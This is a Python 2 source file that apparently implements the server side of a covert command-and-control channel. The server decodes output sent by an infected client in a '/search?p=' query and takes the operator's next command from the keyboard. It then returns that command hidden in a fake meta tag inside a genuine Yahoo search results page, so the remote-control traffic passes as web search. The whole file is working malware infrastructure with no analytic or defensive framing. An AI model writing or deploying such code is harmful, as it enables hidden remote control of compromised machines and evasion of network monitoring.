#!/usr/bin/env python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import urllib
import bs4


def process_client_data(data):
    print data
    new_cmd = raw_input('> ')
    return new_cmd




class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        new_cmd = ''
        query = self.path
        prefix = '/search?p='
        if str(query).startswith(prefix):
            query = query[len(prefix):-1]
            client_cmd_output = urllib.unquote(query).decode('utf8')
            print client_cmd_output
            new_cmd = process_client_data(client_cmd_output)
            query = query.replace('%0D%0A', '')
            if len(query) > 20:
                query = query[:20]

            print query


        # tmp = query.split('?')
        # if len(tmp) > 1:
        #     param1 = str(tmp[1]).split('=')
        #     if len(param1) > 1:
        #         query = param1[1]
        #         client_cmd_output = urllib.unquote(query).decode('utf8')
        #         print client_cmd_output
        #         print query
        #         query = query.replace('%0D%0A', '')
        #         if len(query) > 20:
        #             query = query[:20]

        response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()

        soup = bs4.BeautifulSoup(response)
        # create new link

        new_link = soup.new_tag("meta", property="oq:yahoo_search_engine", xcontent="%s" % new_cmd)
        # insert it into the document
        soup.head.append(new_link)

        cc = soup.find(attrs={"property": "oq:yahoo_search_engine"})
        cmd = cc.attrs['xcontent']

        desc = soup.findAll(attrs={"params": "yahoosearchengine"})
        #print(desc[0]['content'].encode('utf-8'))

        self._set_headers()
        self.wfile.write(soup)

    def do_HEAD(self):
        self._set_headers()


    def do_POST(self):
        # Doesn't do anything with posted data
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        self._set_headers()
        self.wfile.write("<html><body><h1>POST!</h1><pre>" + post_data + "</pre></body></html>")




def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ('Starting httpd...')
    httpd.serve_forever()


if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()